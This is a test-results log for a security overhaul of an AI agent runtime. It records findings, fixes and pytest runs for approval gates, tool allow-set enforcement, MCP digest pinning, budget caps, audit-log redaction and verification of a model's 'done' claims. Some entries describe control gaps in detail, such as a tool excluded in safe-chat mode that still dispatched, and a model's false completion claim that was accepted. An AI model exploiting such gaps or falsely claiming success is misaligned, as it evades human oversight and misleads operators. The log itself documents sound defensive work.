# TEST_RESULTS

## Run: 2026-07-11 00:10 UTC — validation-harness overhaul, SR-4.7 (MCP tool execution wired into production with full enforcement)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `McpManager.call_tool()`/`all_tools()` had real dispatch logic
  but zero call sites in `AgentRuntime` — MCP was management-only in
  practice. Digest verification only ran at connect time;
  `requires_approval` annotations were never consulted.
- Fix: `call_tool()` re-verifies the pinned digest and enforces
  annotation-driven approval (fail-closed without a gate) immediately
  before every call; new `McpToolWrapper(BaseTool)` registers MCP tools
  into the real `ToolRegistry` via `AgentRuntime._sync_mcp_tools()`;
  `AgentConfig.mcp_approval_gate` threaded through; `gateway start`
  wires its existing SR-2.2 `ApprovalGate` in.
- Command: `pytest tests/mcp/test_mcp_manager.py tests/mcp/test_mcp_tool_wrapper.py
  tests/agent/test_runtime_deep.py -k "TestCallToolEnforcement or test_mcp_tool_wrapper or TestMcpToolDispatch" -v`
- Result: `30 passed` (9 in `TestCallToolEnforcement`, 17 in
  `test_mcp_tool_wrapper.py`, 4 in `TestMcpToolDispatch`)
- Command: `pytest tests/mcp/ tests/unit/test_mcp_tool_name_validation.py
  tests/unit/test_mcp_skills_plugins_edges.py tests/unit/test_scheduler_mcp_edges.py
  tests/security/test_scheduler_jobs_selfcreate_webhook_mcp_hardening.py
  tests/security/test_security_hardening_gateway_mcp.py
  tests/integration/test_mcp_skills_integration.py -q`
- Result: `724 passed` (2 pre-existing tests fixed: manual
  `McpManager.__new__()` construction needed new attributes set;
  surfaced 2 tests accidentally exercising non-default
  `block_injection=False` — fixed with explicit override + new
  `test_injection_blocked_by_default` confirming the real default)
- Command: `pytest tests/agent/ tests/mcp/ tests/tools/ tests/cli/ tests/unit/ tests/security/ tests/integration/ -q -o faulthandler_timeout=120`
- Result: `11954 passed, 6 skipped` — no regressions
- Command: `pytest tests/ -q -o faulthandler_timeout=120`
- Result: `3 failed, 20975 passed, 13 skipped in 461.01s (0:07:41)` —
  up from 20947, only the 3 known pre-existing `CameraDiscovery`
  cache-TTL flakes failing, zero regressions from this checkpoint's
  changes.

## Run: 2026-07-10 23:10 UTC — validation-harness overhaul, SR-4.2 (sub-agent delegation wired into production with real limits)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `SubAgentRunner`/`parse_subtasks` had zero production call
  sites (entirely dead code); `run_all()` ran subtasks sequentially
  despite an unused `MAX_CONCURRENT` semaphore; no cross-child budget
  aggregation (independent `AgentRuntime` per subtask via
  `runtime_factory`) or recursion-depth guard.
- Fix: redesigned `SubAgentRunner` to reuse a shared `runtime`/
  `session_id`/`depth`; real `ThreadPoolExecutor`-based wave scheduling
  respecting `depends_on`; `MAX_SUB_AGENT_DEPTH = 2` threaded as an
  explicit parameter through `run()`/`_run_loop()`/`_tool_loop()`/
  `_execute_tool()`; new `delegate_task` tool with `_runtime`/
  `_session_id`/`_depth` kwarg injection.
- Command: `pytest tests/agent/test_sub_agent.py tests/tools/test_delegate_task.py
  tests/agent/test_runtime_deep.py tests/agent/test_agent_modules.py
  tests/agent/test_approval_subagent_edges.py -v`
- Result: `307 passed` (24 new in `test_sub_agent.py`
  `TestRealConcurrency`/`TestMaxSubAgentDepth`/rewritten
  `TestSubAgentRunner`; 12 new in `test_delegate_task.py`; 4 new in
  `test_runtime_deep.py::TestDelegateTaskDispatch`; 2 pre-existing files
  updated to the new shared-runtime constructor, no assertion weakened)
- Command: `pytest tests/agent/ tests/tools/ tests/cli/ tests/unit/ tests/security/ -q -o faulthandler_timeout=120`
- Result: `11034 passed, 6 skipped` — no regressions
- Command: `pytest tests/ -q -o faulthandler_timeout=120`
- Result: `3 failed, 20947 passed, 13 skipped in 470.38s (0:07:50)` —
  up from 20928, only the 3 known pre-existing `CameraDiscovery`
  cache-TTL flakes failing, zero regressions from this checkpoint's
  changes.

## Run: 2026-07-10 22:05 UTC — validation-harness overhaul, SR-4.3 (real checkpoint resume)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `missy recover` classified/displayed a `"resume"` action for
  fresh checkpoints, but no code anywhere ever read a checkpoint's
  saved `loop_messages`/`iteration` back and continued the tool loop —
  `grep -rn "\.resume(\|def resume\|restore_checkpoint\|resume_checkpoint\|load_checkpoint" missy/`
  matched nothing relevant. The only real action available was
  `--abandon-all`.
- Fix: `CheckpointManager.get()`, `validate_loop_messages()`,
  `AgentRuntime.resume_checkpoint()` (fail-closed on not-found/
  not-RUNNING/corrupted, re-resolves system prompt + tools under
  current config before resuming via the real `_tool_loop()`),
  `missy recover --resume ID`.
- Command: `pytest tests/agent/test_checkpoint.py tests/agent/test_runtime_deep.py -v`
- Result: `184 passed` (new: `TestGet`, `TestValidateLoopMessages`,
  `TestResumeCheckpoint` — 6 tests exercising the real resume path
  against a real SQLite-backed `CheckpointManager`, no mocks)
- Command: `pytest tests/cli/test_cost_recover.py -v`
- Result: `13 passed` (new: `TestRecoverResume`, 4 tests)
- Command: `pytest tests/agent/ tests/cli/ tests/unit/ tests/security/ tests/scheduler/ -q -o faulthandler_timeout=120`
- Result: `9853 passed, 4 skipped` — no regressions
- Command: `pytest tests/ -q -o faulthandler_timeout=120`
- Result: `3 failed, 20928 passed, 13 skipped in 459.64s (0:07:39)` —
  up from 20903, only the 3 known pre-existing `CameraDiscovery`
  cache-TTL flakes failing, zero regressions from this checkpoint's
  changes.

## Run: 2026-07-10 21:15 UTC — validation-harness overhaul, SR-4.5 (self_create_tool honesty about proposal-only status)

- Branch: `overhaul/missy-validation-20260710-031406`
- Product-policy decision confirmed with operator before implementing:
  keep `self_create_tool` proposal-only (don't build dynamic tool
  loading) and fix its dishonest "created"/"registered" messaging
  instead.
- Finding: `self_create_tool.py`'s docstring/success message and
  `docs/implementation/module-map.md` all claimed created scripts were
  "registered"/"created" as usable tools; `grep -rn
  "custom-tools\|CUSTOM_TOOLS_DIR" missy/` confirmed nothing in the
  codebase ever loads `~/.missy/custom-tools/` into the live
  `ToolRegistry` — a written script can never be called.
- Fix: rewrote every user-facing string this tool returns
  (docstring, `description`, `list`/`create`/`delete` messages) to say
  "proposal"/"written for review," never "created"/"registered."
  Corrected `docs/implementation/module-map.md` and
  `docs/security.md`.
- Command: `pytest tests/tools/test_self_create_tool.py
  tests/tools/test_builtin_tools.py
  tests/unit/test_discord_upload_self_create_tool_coverage.py
  tests/unit/test_vault_audit_discovery_tools_coverage.py
  tests/security/test_scheduler_jobs_selfcreate_webhook_mcp_hardening.py
  tests/security/test_self_create_tool_expanded_blocklist.py
  tests/security/test_self_create_tool_script_validation.py -q`
- Result: `363 passed` (3 pre-existing string-assertion updates to
  track the intentionally changed wording; no assertion weakened)
- Command: `pytest tests/tools/ tests/unit/ tests/security/ -q -o faulthandler_timeout=120`
- Result: `5782 passed, 2 skipped` — no regressions
- Command: `pytest tests/ -q -o faulthandler_timeout=120`
- Result: `3 failed, 20903 passed, 13 skipped in 459.75s (0:07:39)` — same
  count as the SR-4.4 checkpoint, only the 3 known pre-existing
  `CameraDiscovery` cache-TTL flakes failing, zero regressions from
  this checkpoint's changes.

## Run: 2026-07-10 20:40 UTC — validation-harness overhaul, SR-4.4 (done-criteria verification wired into task completion)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `_tool_loop()`'s `finish_reason == "stop"` branch trusted a
  model's "done" claim unconditionally, with zero cross-reference
  against the immediately preceding round's actual `ToolResult.is_error`
  outcomes. `is_compound_task()`/`make_done_prompt()`/`DoneCriteria` in
  `missy/agent/done_criteria.py` are unused dead code; only
  `make_verification_prompt()` (a static text nudge) was wired in, and
  only for the "keep calling tools" branch, not the "stop" branch.
- Live reproduction: a `calculator` tool call that errored, immediately
  followed by the model claiming `"Done! I successfully computed the
  result."` with `finish_reason="stop"`, was returned as final output
  with zero rejection and zero audit event. Confirmed via `git stash`
  this reproduces on the pre-fix tree.
- Design iteration: first attempt reused `_mutation_fp_errors`
  (fingerprint-keyed error history) as the gating signal; live-testing
  a corrected-retry scenario revealed this never clears an original
  fingerprint's error after a successful retry with different
  arguments, causing permanent false-positive rejections. Replaced with
  `_last_round_errors`, overwritten (not accumulated) every round.
- Fix: `_tool_loop()` rejects a "stop"/"length" claim when
  `_last_round_errors` is non-empty, up to
  `_MAX_DONE_VERIFICATION_RETRIES = 2` times, emitting
  `agent.done_criteria.rejected` (deny) each time; if retries exhaust
  with the error still unresolved, the response is still returned but
  tagged `agent.done_criteria.unverified` (warn) rather than treated as
  verified.
- Command: `pytest tests/agent/test_runtime_deep.py::TestDoneCriteriaEnforcement -v`
- Result: `3 passed` (new: false-completion-rejected-then-warned,
  happy-path-unaffected, corrected-retry-accepted-immediately)
- Command: `pytest tests/agent/ tests/unit/ tests/security/ tests/cli/
  tests/api/ -q -o faulthandler_timeout=120`
- Result: `9637 passed` — no regressions (5 pre-existing tests across 4
  files fixed with additional mocked provider responses to accommodate
  the new bounded retry behavior; original assertions preserved)
- Command: `pytest tests/ -q -o faulthandler_timeout=120`
- Result: `3 failed, 20903 passed, 13 skipped in 475.16s (0:07:55)` —
  up from 20900, only the 3 known pre-existing `CameraDiscovery`
  cache-TTL flakes failing, unrelated to this checkpoint's changes.

## Run: 2026-07-10 19:55 UTC — validation-harness overhaul, SR-3.4 residual (CostTracker cross-session aggregation)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `AgentRuntime` constructed one shared `CostTracker` for its
  entire lifetime despite `max_spend_usd` being documented as a
  per-session cap; one session exhausting the budget silently blocked
  every other session sharing that runtime instance.
- Live reproduction: session "bob" (zero spend) was incorrectly denied
  due to session "alice" exceeding the cap; confirmed via `git stash`
  this reproduces on the pre-fix tree.
- Fix: replaced the single `self._cost_tracker` with
  `self._cost_trackers: dict[str, CostTracker]` keyed by session_id,
  a `_cost_tracking_enabled` master switch, `_get_cost_tracker()`/
  `_peek_cost_tracker()` accessors (bounded at 5,000 tracked sessions
  with oldest-first eviction).
- Command: `pytest tests/agent/test_runtime_enhancements.py -v`
- Result: `25 passed` (7 new tests: `TestCostTrackerCrossSessionIsolation`
  class of 6 plus one new end-to-end dispatch test)
- Command: `pytest tests/agent/ tests/unit/ tests/security/ tests/cli/
  tests/api/ tests/scheduler/ -q -o faulthandler_timeout=120`
- Result: `9979 passed, 4 skipped` — no regressions
- Command: `pytest tests/ -q -o faulthandler_timeout=120`
- Result: `3 failed, 20900 passed, 13 skipped in 460.13s (0:07:40)` —
  up from 20893, only the 3 known pre-existing `CameraDiscovery`
  cache-TTL flakes failing, unrelated to this checkpoint's changes.

## Run: 2026-07-10 19:10 UTC — validation-harness overhaul, SR-2.2 (real ApprovalGate wired for proactive triggers; requires_confirmation defaults to True)

- Branch: `overhaul/missy-validation-20260710-031406`
- Product-policy decision confirmed with operator before implementing:
  proactive triggers should default to requiring confirmation via a
  real ApprovalGate, not auto-run or be disabled outright.
- Finding: `ProactiveTrigger.requires_confirmation` and its config
  schema equivalent both defaulted to `False`; `ApprovalGate` had zero
  production construction sites anywhere in the codebase (only its own
  docstring example); `ProactiveManager` was constructed with no
  `approval_gate` argument; `missy approvals list` was a hardcoded dead
  stub.
- Fix: flipped both `requires_confirmation` defaults to `True`.
  Constructed a real, process-shared `ApprovalGate` in `cli/main.py`'s
  `gateway start`, wired into both `ProactiveManager` and the Web API
  server. Added `ApprovalGate.approve_by_id()`/`.deny_by_id()`. Added 3
  new REST endpoints (`GET /api/v1/approvals`, `POST .../approve`,
  `POST .../deny`) on the Web API server. Rewrote `missy approvals
  list` and added `missy approvals approve/deny ID` to make real
  authenticated HTTP calls against these endpoints.
- Command: `pytest tests/agent/test_approval_gate.py
  tests/api/test_server.py::TestApprovalsEndpoints
  tests/cli/test_cli_main_gaps.py::TestGatewayStartProactiveApprovalGateWiring -v`
- Result: `30 passed`
- Fixture fallout (expected): 23 pre-existing tests across 6 files
  (`tests/agent/test_proactive.py`,
  `tests/agent/test_proactive_coverage.py`,
  `tests/agent/test_proactive_gaps.py`,
  `tests/agent/test_proactive_checkpoint_cost_edges.py`,
  `tests/agent/test_summarizer_proactive_edges.py`,
  `tests/security/test_shell_fts5_proactive_scheduler_hardening.py`,
  `tests/unit/test_remaining_gaps.py`) relied on the old implicit
  `requires_confirmation=False` default to test cooldown/template/
  callback logic unrelated to confirmation itself — fixed by adding
  `requires_confirmation=False` explicitly to those constructions.
- Command: `pytest tests/agent/ tests/api/ tests/cli/ tests/config/
  tests/scheduler/ tests/security/ tests/unit/ -q
  -o faulthandler_timeout=120`
- Result: all pass except 14 confirmed pre-existing, unrelated
  test-order-dependent flakes in `tests/agent/test_runtime.py`
  (reproduced identically via `git stash` against the pre-fix tree —
  same failure signature, same test IDs, unrelated to this checkpoint)
- Command: `pytest tests/ -q -o faulthandler_timeout=120`
- Result: `3 failed, 20893 passed, 13 skipped in 450.66s (0:07:30)` —
  up from 20880 (13 new tests net), only the 3 known pre-existing
  `CameraDiscovery` cache-TTL flakes failing, unrelated to this
  checkpoint's changes.

## Run: 2026-07-10 18:20 UTC — validation-harness overhaul, SR-2.1 (scheduled jobs default to safe-chat capability_mode, not full)

- Branch: `overhaul/missy-validation-20260710-031406`
- Product-policy decision confirmed with operator before implementing:
  scheduled jobs should default to a restricted `capability_mode`
  rather than `"full"`.
- Finding: `SchedulerManager._run_job()` constructed
  `AgentConfig(provider=job.provider)` with no `capability_mode`
  override, so every scheduled job ran with the class default
  (`"full"`) — identical tool access to an interactive session, but
  unattended. `ScheduledJob` had no `capability_mode` field at all.
- Fix: added `ScheduledJob.capability_mode: str = "safe-chat"`
  (round-tripped through serialization, fail-closed default for legacy/
  unrecognized values); `SchedulerManager.add_job(capability_mode=...)`
  with validation against `VALID_CAPABILITY_MODES = ("full",
  "safe-chat", "no-tools")`; `_run_job()` now passes
  `job.capability_mode` into `AgentConfig`; new `missy schedule add
  --capability-mode` CLI flag (default `safe-chat`) and a `Mode` column
  in `missy schedule list`.
- Command: `pytest tests/scheduler/test_jobs.py
  tests/scheduler/test_manager_extended.py
  tests/cli/test_cli_commands.py -q`
- Result: all pass (20 new tests: defaults/round-trip/fail-closed
  legacy default/invalid-value fallback in `test_jobs.py`; real
  `SchedulerManager`/`_run_job` end-to-end default-vs-explicit-full in
  `test_manager_extended.py`; CLI flag forwarding + invalid-value
  rejection in `test_cli_commands.py`)
- Command: `pytest tests/agent/ tests/tools/ tests/cli/
  tests/scheduler/ tests/skills/ tests/unit/ tests/memory/ -q
  -o faulthandler_timeout=120`
- Result: `10060 passed, 13 skipped` (up from 10050) — no regressions
- Command: `pytest tests/ -q -o faulthandler_timeout=120`
- Result: `3 failed, 20880 passed, 13 skipped in 458.82s (0:07:38)` —
  up from 20870 (10 new tests), only the 3 known pre-existing
  `CameraDiscovery` cache-TTL flakes failing, unrelated to this
  checkpoint's changes.

## Run: 2026-07-10 17:45 UTC — validation-harness overhaul, SR-3.5 (non-atomic JSON writes confirmed unreachable; 3 wrong-backend bugs found and fixed)

- Branch: `overhaul/missy-validation-20260710-031406`
- Investigation: confirmed `MemoryStore._save()`'s non-atomic full-file
  write is genuinely unreachable from production — its 3 construction
  sites never call a write method. But that investigation found 3 live
  bugs: `summarize_session.py` skill and both `cleanup_memory()`
  (scheduler) / `sessions_cleanup` (CLI) referenced the legacy JSON
  `MemoryStore` instead of the production `SQLiteMemoryStore`, so the
  skill always returned "no turns recorded" and both cleanup paths
  always silently no-op'd (the `hasattr(store, "cleanup")` guard was
  always `False` against the real `MemoryStore`, which has no such
  method).
- Root cause of non-detection: every affected test patched
  `missy.memory.store.MemoryStore` with a bare `MagicMock()`, which
  auto-vivifies a `.cleanup` attribute the real class lacks — tests saw
  `hasattr() == True` while production saw `False`.
- Fix: switched all 3 call sites to `SQLiteMemoryStore()`; fixed
  `summarize_session.py`'s `_format_turns()` (assumed `datetime`,
  crashes on the new store's `str` timestamp — now uses `[:19]`
  slicing); removed the dead `hasattr` guards. Deleted 3 tests that
  encoded the old broken behavior as correct; updated remaining tests'
  patch targets to `missy.memory.sqlite_store.SQLiteMemoryStore`.
- Command: `pytest tests/skills/test_builtin_skills.py
  tests/cli/test_cli_commands.py tests/cli/test_cli_main_extended.py
  tests/scheduler/test_manager_coverage.py
  tests/scheduler/test_manager_extended.py
  tests/scheduler/test_scheduler_extended.py
  tests/unit/test_scheduler_memory_edges.py -q`
- Result: `548 passed`
- Command: `pytest tests/agent/ tests/tools/ tests/cli/
  tests/scheduler/ tests/skills/ tests/unit/ tests/memory/ -q
  -o faulthandler_timeout=120`
- Result: `10050 passed, 13 skipped` (up from 10047 — 3 new live-store
  regression tests: `test_reads_real_turns_from_sqlite_backend`,
  `test_cleanup_memory_actually_deletes_from_real_store`,
  `test_sessions_cleanup_actually_deletes_from_real_store`, each using
  a real `SQLiteMemoryStore` against a real temp DB, not mocks) — no
  regressions.
- Command: `pytest tests/ -q -o faulthandler_timeout=120`
- Result: `3 failed, 20870 passed, 13 skipped in 440.33s (0:07:20)` —
  net zero change from the prior (SR-3.3) checkpoint's 20870 (3
  obsolete tests removed that encoded the old broken behavior as
  correct, 3 new live-store regression tests added). The 3 failures
  are the same known pre-existing `CameraDiscovery` cache-TTL flakes
  (task #11), unrelated to this checkpoint's changes.

## Run: 2026-07-10 17:05 UTC — validation-harness overhaul, SR-3.3 (memory_search/memory_describe/memory_expand completely non-functional in production)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: two independent stacked bugs meant these three tools never
  worked in production. (1) None declared the `permissions:
  ToolPermissions` attribute `ToolRegistry._check_permissions()`
  requires — dispatch through the real registry crashed with
  `AttributeError` before the tool ran. (2) Even fixed, `AgentRuntime
  ._execute_tool()` never injected the `_memory_store`/`_session_id`
  kwargs these tools read — dispatch would still return "Memory store
  is not available." Every existing test called `tool.execute
  (_memory_store=store, ...)` directly, bypassing both bugs.
- Live reproduction: via the real `AgentRuntime._execute_tool()`
  method, `memory_expand` on a real stored large-content record
  returned `is_error=True`, `content="Tool execution failed due to an
  internal error."`. Confirmed via `git stash` this reproduces on the
  pre-fix tree. Confirmed fixed: identical reproduction now returns
  `is_error=False` with the exact stored content.
- Fix: added `permissions = ToolPermissions()` to `MemorySearchTool`/
  `MemoryDescribeTool`/`MemoryExpandTool` (replacing vestigial unused
  attributes). Added a `_MEMORY_RETRIEVAL_TOOL_NAMES` injection block
  in `AgentRuntime._execute_tool()` (mirrors the existing SR-2.4
  heredoc special-case pattern) that supplies `_memory_store`/
  `_session_id` for these three tool names only.
- Session-scoping check: with the wiring fixed, verified `memory_search`
  correctly defaults to the calling session only when the model omits
  `session_id` (two sessions sharing a keyword — only the calling
  session's turn returned), while still honoring an explicit override
  for intentional cross-session lookups (documented, opt-in behavior).
- Command: `pytest tests/agent/test_memory_tool_dispatch_wiring.py
  tests/tools/test_memory_tools.py -v`
- Result: `36 passed` (10 new tests: 4 in
  `TestMemoryToolsDispatchThroughRealRegistry`, 6 in the new
  `test_memory_tool_dispatch_wiring.py`)
- Command: `pytest tests/agent/ tests/tools/ -q -o faulthandler_timeout=120`
- Result: `5656 passed, 6 skipped` — no regressions
- Command: `pytest tests/ -q -o faulthandler_timeout=120`
- Result: `3 failed, 20870 passed, 13 skipped in 446.04s (0:07:26)` —
  the 3 failures are the same known pre-existing `CameraDiscovery`
  cache-TTL flakes (task #11), unrelated to this checkpoint's changes.
  10 more passing than the prior (SR-3.2) checkpoint's 20860, matching
  the 10 tests added this checkpoint exactly; no regressions.

## Run: 2026-07-10 16:15 UTC — validation-harness overhaul, SR-3.2 (Summarizer called nonexistent provider.chat())

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `Summarizer._call_llm()` called `self._provider.chat(...)`, a
  method no provider implements (`BaseProvider` only defines
  `complete()`/`complete_with_tools()`). Tiers 1 and 2 of `_escalate()`
  raised `AttributeError` on every call, silently caught, always
  falling through to Tier 3's deterministic truncation — which
  truncates the *prompt template string*, so persisted "summaries" were
  mostly boilerplate, not real content. Root cause of non-detection: all
  3 affected test files mocked the provider as a bare `MagicMock()`
  (no `spec`), which auto-vivifies `.chat` instead of raising
  `AttributeError` like a real provider.
- Live reproduction: `Summarizer(provider=MagicMock(spec=["complete",
  "complete_with_tools", "is_available", "name"]))` →
  `summarize_turns(...)` produced `tier_counts: {'normal': 0,
  'aggressive': 0, 'fallback': 1}`, `provider.complete.called == False`.
  Confirmed fixed: identical reproduction now shows `tier_counts:
  {'normal': 1, 'aggressive': 0, 'fallback': 0}`,
  `provider.complete.called == True`, real summary text returned.
- Independently re-verified (not assumed) the other two sub-bugs the
  security review named: `_format_turns()`'s `timestamp[:19]` slicing is
  safe against the real `str`-typed `ConversationTurn.timestamp`; every
  `memory_store` method `compact_session()` calls exists on the
  production `SQLiteMemoryStore`. Both marked "no longer applicable" —
  likely resolved as a side effect of the session's earlier FX-B fix.
- Fix: `_call_llm()` now calls `self._provider.complete(messages,
  temperature=temperature, max_tokens=4096)`. Corrected the
  `Summarizer.__init__` docstring's stale `chat()`-or-`complete()`
  claim. Switched all provider mocks in `test_summarizer.py`,
  `test_compaction.py`, `test_compaction_extended.py` to
  `MagicMock(spec=BaseProvider)` so this class of bug can't recur
  silently; renamed `FakeProvider.chat()` → `.complete()` in
  `test_summarizer_proactive_edges.py`.
- Command: `pytest tests/agent/test_summarizer.py
  tests/agent/test_compaction.py tests/agent/test_compaction_extended.py
  tests/agent/test_summarizer_proactive_edges.py
  tests/agent/test_compaction_context_edges.py -v`
- Result: `129 passed` (2 new tests in
  `TestSummarizeTurns::test_calls_provider_complete_not_chat` and
  `::test_real_provider_interface_rejects_chat_call`)
- Command: `pytest tests/agent/ -q -o faulthandler_timeout=120`
- Result: `4143 passed, 4 skipped` — no regressions
- Command: `pytest tests/ -q -o faulthandler_timeout=120`
- Result: `3 failed, 20860 passed, 13 skipped in 444.29s (0:07:24)` — the
  3 failures are exactly the known pre-existing `CameraDiscovery`
  cache-TTL flakes (`tests/vision/test_discovery_capture_sysfs.py::TestCacheTTL::test_cache_valid_within_ttl`,
  `tests/vision/test_discovery_edge_cases.py::TestPermissionDeniedOnDevice::test_device_that_does_not_exist_is_skipped`,
  `tests/vision/test_discovery_edge_cases.py::TestRapidAddRemove::test_cached_results_returned_within_ttl`
  — tracked as task #11, unrelated to this checkpoint's changes). 2 more
  passing than the prior (SR-3.4) checkpoint's 20858, matching the 2
  tests added this checkpoint exactly; no regressions.

## Run: 2026-07-10 15:50 UTC — validation-harness overhaul, SR-3.4 (budget cap checked only after the paid provider call)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `_tool_loop()` called the paid provider before checking
  budget, so once accumulated spend had already crossed
  `max_spend_usd`, the next call still happened and incurred real cost
  before being denied. `_single_turn()` never called `_check_budget()`
  at all, in either direction.
- Live reproduction: with the cost tracker's accumulated cost pre-set
  above the configured cap, calling `_tool_loop()` still invoked
  `provider.complete_with_tools()` (confirmed via mock call assertion)
  before `BudgetExceededError` fired afterward. Confirmed fixed: the
  identical scenario now confirms `provider.complete_with_tools()`/
  `provider.complete()` are never called.
- Fix: added a budget check at the top of each `_tool_loop()` iteration
  (before the provider call, using cost already accumulated from prior
  calls) and to `_single_turn()` on both sides of its provider call.
- Command: `pytest tests/agent/test_runtime_enhancements.py -q`
- Result: `18 passed` (5 new tests in
  `TestBudgetCheckedBeforePaidCall`)
- Command: `pytest tests/agent/ tests/tools/ tests/policy/ tests/integration/ -q`
- Result: `6834 passed, 6 skipped`
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20858 passed, 13 skipped, 3 deselected in 448.64s (0:07:28)`
  — 5 more passing than the prior (SR-2.3) checkpoint's 20853, matching
  the tests added this checkpoint exactly; no regressions.

---

## Run: 2026-07-10 15:15 UTC — validation-harness overhaul, SR-2.3 (execution-time tool allow-set not revalidated at dispatch)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `_tool_loop()` resolves the per-turn visible tool set once
  via `_get_tools()` (capability_mode + tool_policy), but
  `_execute_tool()` dispatched any registry-known tool name the model
  returned with no check against that resolved set.
- Live reproduction against real `AgentRuntime`/`_get_tools()`/
  `_execute_tool()` code: with `capability_mode="safe-chat"`,
  `_get_tools()` correctly excluded `shell_exec` from the visible set,
  yet calling `_execute_tool()` directly with a `shell_exec` call still
  dispatched to `registry.execute()` and returned success. Confirmed
  fixed: the identical call now returns `is_error=True` with
  `registry.execute` never invoked.
- Fix: `_tool_loop()` computes `allowed_tool_names` from the exact
  `tools` list it resolved and passes it to every `_execute_tool()`
  call; `_execute_tool()` refuses any name outside that set before the
  registry is consulted, emitting a `tool_execute`/`deny` audit event.
  `None` (default) skips the check for backward compatibility.
- Command: `pytest tests/agent/test_coverage_gaps.py tests/agent/test_mutation_fingerprint.py -q`
- Result: `103 passed` (6 new tests in
  `TestRuntimeExecuteToolAllowSet`; 3 pre-existing tests updated for
  the new kwarg)
- Command: `pytest tests/agent/ tests/tools/ tests/policy/ tests/integration/ -q`
- Result: `6829 passed, 6 skipped`
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20853 passed, 13 skipped, 3 deselected in 446.09s (0:07:26)`
  — 6 more passing than the prior (SR-2.4) checkpoint's 20847, matching
  the tests added this checkpoint exactly; no regressions.

---

## Run: 2026-07-10 14:40 UTC — validation-harness overhaul, SR-2.4 (heredoc rewrite wrote model code to disk before policy approval)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `_rewrite_heredoc_command()` wrote a model-supplied heredoc
  body to a real temp file *before* the shell policy check, which only
  happens later inside `registry.execute()`. No interpreter allowlist
  check existed in this function at all.
- Live reproduction: calling it with a heredoc body reading
  `SUPER_SECRET_TOKEN` from the environment wrote the full script to
  `/tmp/missy_heredoc_*.py` unconditionally, regardless of whether
  `"python3"` would ever be permitted to execute. Confirmed fixed: with
  `"python3"` not allowlisted, zero new files appear on disk at any
  point (verified via before/after glob of `/tmp/missy_heredoc_*`).
- Fix: the interpreter is checked against the real shell policy (reusing
  SR-1.7's uniform check) before anything is written; on denial or an
  uninitialised policy engine, the original heredoc-laden command is
  returned unmodified and denied normally by `registry.execute()`. The
  temp file path is now returned to the caller, which wraps the
  tool-dispatch retry loop in a `try/finally` that unconditionally
  deletes it once the tool call finishes — closing the related "never
  deleted, may hold secrets" defect.
- Command: `pytest tests/agent/test_runtime_config_edges.py -q`
- Result: `97 passed` (3 new tests in
  `TestRewriteHeredocCommandPolicyGate`; ~20 pre-existing tests updated
  for the new `(tool_args, tmppath)` return signature)
- Command: `pytest tests/agent/ tests/tools/ tests/policy/ tests/security/ tests/integration/ -q`
- Result: `8864 passed, 6 skipped`
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20847 passed, 13 skipped, 3 deselected in 443.13s (0:07:23)`
  — 3 more passing than the prior (SR-1.11) checkpoint's 20844, matching
  the tests added this checkpoint exactly; no regressions.

---

## Run: 2026-07-10 14:05 UTC — validation-harness overhaul, SR-1.11 (MCP manifest digest pinning self-destructs on reconnect)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `McpManager._save_config()` rebuilt every config entry
  purely from `self._clients` (`name`/`command`/`url`), silently
  dropping any `digest` field. `add_server()` calls `_save_config()`
  unconditionally after every successful connect, including
  reconnects, so the very next ordinary `McpManager` restart after a
  successful `missy mcp pin` erases the pin.
- Live reproduction: pinned a server's digest, simulated a process
  restart via `connect_all()` on a fresh `McpManager` reading the same
  config file — the `digest` key was completely gone afterward.
  Confirmed the consequence: with the pin erased, a tampered tool
  manifest connects successfully with no error, warning, or audit
  signal. Confirmed fixed: the digest now survives one reconnect
  cycle, three repeated reconnect cycles, and a tampered manifest
  presented after a clean reconnect is still correctly denied.
- Fix: `_save_config()` now reads the existing on-disk config first to
  recover each server's currently pinned digest and merges it back
  into the freshly rebuilt entries before writing.
- Command: `pytest tests/mcp/test_manager_edges.py -q`
- Result: `133 passed` (6 new tests in
  `TestSaveConfigPreservesDigest`)
- Command: `pytest tests/mcp/ tests/cli/ -q -k "mcp or Mcp"`
- Result: `374 passed, 1019 deselected`
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20844 passed, 13 skipped, 3 deselected in 438.56s (0:07:18)`
  — 6 more passing than the prior (SR-1.10) checkpoint's 20838, matching
  the tests added this checkpoint exactly; no regressions.

---

## Run: 2026-07-10 13:35 UTC — validation-harness overhaul, SR-1.10 (audit sink wrote secrets to disk unredacted)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `AuditLogger._handle_event()` wrote every event's `detail`
  dict to `~/.missy/audit.jsonl` completely verbatim, with no redaction
  of any kind. `api/audit_browser.py` only redacts at display time — a
  cosmetic filter that can't undo what's already on disk.
- Live reproduction: publishing an audit event with a bearer token, an
  AWS presigned-URL signature, and a Google-API-key-shaped URL query
  value resulted in all three appearing in plaintext in the on-disk
  JSONL file. Confirmed fixed: all three now redact to `[REDACTED]`.
- Fix: `_redact_detail()` recursively applies
  `missy.security.censor.censor_response()` to every string leaf of
  `detail`, wired into `AuditLogger._handle_event()`. Added
  `bearer_token`, `basic_auth_header`, `aws_presigned_signature`
  patterns to `SecretsDetector.SECRET_PATTERNS` (50→53) — the two token
  shapes the review named explicitly.
- Command: `pytest tests/observability/test_audit_logger.py -q`
- Result: `25 passed` (6 new tests in `TestHandleEventRedactsSecrets`)
- Command: `pytest tests/observability/ tests/security/ tests/tools/ tests/agent/ tests/gateway/ tests/api/ -q`
- Result: `8293 passed, 6 skipped` (one intermittent, pre-existing,
  unrelated Hypothesis-deadline flake in
  `test_property_based_fuzz.py::TestNetworkPolicyEngineFuzz::test_check_host_never_crashes_on_arbitrary_unicode`
